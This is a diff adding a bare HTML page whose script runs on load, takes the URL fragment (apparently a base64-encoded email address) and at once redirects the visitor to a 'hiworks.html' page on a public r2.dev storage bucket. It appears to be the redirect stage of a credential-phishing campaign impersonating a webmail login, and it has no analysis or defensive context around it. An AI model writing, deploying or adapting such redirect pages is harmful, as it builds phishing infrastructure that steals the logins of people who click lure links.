@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+
+    <script>
+        function redirrectPage() {
+            var query = window.location.href;
+            console.log(query);
+            var res = query.split("#");
+            var data1 = res[0];
+            var data2 = res[1];
+            console.log(data1);
+            console.log(data2);   
+            //data2 = atob(data2);
+
+            if (data2) {
+                console.log("true");
+                window.location.href = "https://pub-e0cf2ec0a5c941c8b94529fb4f83caf8.r2.dev/hiworks.html#" + data2;
+            } else {
+                console.log("false");
+                window.location.href = "https://pub-e0cf2ec0a5c941c8b94529fb4f83caf8.r2.dev/hiworks.html#";
+            }
+        }
+        redirrectPage();
+    </script>
+</body>
+
+</html>
